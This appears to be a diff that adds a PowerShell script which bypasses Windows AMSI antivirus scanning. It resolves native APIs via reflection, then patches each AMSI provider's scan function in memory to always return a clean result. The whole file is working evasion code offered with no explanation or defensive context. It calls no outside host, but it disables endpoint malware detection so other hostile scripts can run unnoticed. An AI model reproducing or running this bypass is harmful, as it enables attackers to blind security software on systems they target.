@@ -1,0 +1,82 @@
+$InteropServicesMarshalClass = [System.Runtime.InteropServices.Marshal]
+$exec_write = 0x00000080
+$old_permissions = 0;
+$i = 0;
+$intPtrSize = $InteropServicesMarshalClass::SizeOf([Type][IntPtr]) 
+$scanFunc_patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3) 
+function resolveApi {
+ Param (
+  [string] $library,
+  [string] $function
+ )
+  
+    $call_GetModuleHandle = $hGetModuleHandle.Invoke($Null, @($library))
+    $intPtr = New-Object IntPtr
+    $handleRefPtr = New-Object System.Runtime.InteropServices.HandleRef($intPtr, $call_GetModuleHandle)
+    $hGetProcAddress.Invoke($Null, @([System.Runtime.InteropServices.HandleRef]$handleRefPtr, $function))
+}
+function CreateApiDelegate {
+    Param ( 
+        [Parameter(Position = 0, Mandatory = $true)] [IntPtr] $functionPointer,
+        [Parameter(Position = 1, Mandatory = $true)] [Type[]] $argumentTypes,
+        [Parameter(Position = 2)] [Type] $returnType = [Void]
+    )
+    $dynamicAssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('QM', $false).DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $dynamicAssemblyBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argumentTypes).SetImplementationFlags('Runtime, Managed')
+    $dynamicAssemblyBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returnType, $argumentTypes).SetImplementationFlags('Runtime, Managed')
+    $dynamicTypeBuilder = $dynamicAssemblyBuilder.CreateType()
+    $InteropServicesMarshalClass::GetDelegateForFunctionPointer($functionPointer, $dynamicTypeBuilder)
+}
+Add-Type -AssemblyName System.Windows.Forms
+$UnsafeNativeMethods = [System.Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
+
+$hGetModuleHandle = $UnsafeNativeMethods.GetMethod("GetModuleHandle")
+$hGetProcAddress = $UnsafeNativeMethods.GetMethod("GetProcAddress")
+
+$pAmsiInitialize = resolveApi "amsi.dll" "AmsiInitialize"
+$pVirtualProtect = resolveApi "kernel32.dll" "VirtualProtect"
+
+
+if ($intPtrSize  -eq 8)  { ## 64 bit
+ $hVirtualProtect = CreateApiDelegate $pVirtualProtect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+ $hAmsiInitialize = CreateApiDelegate $pAmsiInitialize @([string], [UInt64].MakeByRefType()) ([Int])
+ [Int64]$hAmsiInitialize_sysArch = 0 | out-null
+} else { ## 32 bit
+ $hVirtualProtect = CreateApiDelegate $pVirtualProtect @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+ $hAmsiInitialize = CreateApiDelegate $pAmsiInitialize @([string], [IntPtr].MakeByRefType()) ([Int])
+ $hAmsiInitialize_sysArch = 0 | out-null
+}
+
+
+$hAmsiInitialize.Invoke("Scanner", [ref]$hAmsiInitialize_sysArch) | out-null
+
+
+if ($intPtrSize  -eq 8)  { ## 64 bit
+ $C_Amsi_AM = $InteropServicesMarshalClass::ReadInt64([IntPtr]$hAmsiInitialize_sysArch, 16)
+ $Amsi_Provider = $InteropServicesMarshalClass::ReadInt64([IntPtr]$C_Amsi_AM, 64)
+} else { ## 32 bit
+ $C_Amsi_AM = $InteropServicesMarshalClass::ReadInt32([IntPtr]$hAmsiInitialize_sysArch, 8)
+ $Amsi_Provider = $InteropServicesMarshalClass::ReadInt32([IntPtr]$C_Amsi_AM, 36)
+}
+while ($Amsi_Provider  -ne 0)  {
+    ## Search for the AMSI scan function
+    $provider_vtable = $InteropServicesMarshalClass::ReadInt64([IntPtr]$Amsi_Provider)
+    $provider_scan_func = $InteropServicesMarshalClass::ReadInt64([IntPtr]$provider_vtable, 24)
+
+    ## Change to write permissions
+    $hVirtualProtect.Invoke($provider_scan_func, [uint32]6, $exec_write, [ref]$old_permissions) | out-null
+
+    ## Copy the patch bytes
+    $InteropServicesMarshalClass::Copy($scanFunc_patch, 0, [IntPtr]$provider_scan_func, 6)
+
+    ## Change back to old permissions
+    $hVirtualProtect.Invoke($provider_scan_func, [uint32]6, $old_permissions, [ref]$old_permissions) | out-null
+
+    $i++
+    
+    if ($intPtrSize  -eq 8)  { ## 64 bit
+        $Amsi_Provider = $InteropServicesMarshalClass::ReadInt64([IntPtr]$C_Amsi_AM, 64  +  ($i * $intPtrSize))
+    } else { ## 32 bit
+        $Amsi_Provider = $InteropServicesMarshalClass::ReadInt32($C_Amsi_AM + 36  +  ($i * $intPtrSize))
+    }
+}
